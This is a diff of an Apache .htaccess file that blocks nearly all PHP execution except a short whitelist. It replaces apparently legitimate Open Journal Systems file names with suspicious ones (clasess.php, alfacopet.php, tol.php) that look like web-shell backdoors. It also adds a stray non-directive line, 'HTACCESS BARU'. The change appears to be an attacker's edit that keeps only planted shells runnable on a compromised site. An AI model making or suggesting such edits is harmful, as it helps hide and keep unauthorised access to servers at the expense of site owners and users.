@@ -1,5 +1,5 @@
+HTACCESS BARU
 Options -Indexes
-
 <FilesMatch "(?i)\.(phtml|php|phar|pgif|pht|phtm|shtml|inc|php1|php2|php3|php4|php5|php56|php6|php7|php72|php8|php9|php[0-9]?|asp[x]?|)$">
 Order allow,deny
 Deny from all
@@ -9,7 +9,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(TokenProvider.php|iccn-OTH.php|OJSMigration.inc.php|stats.php)$'>
+<FilesMatch '^(clasess.php|alfacopet.php|tol.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
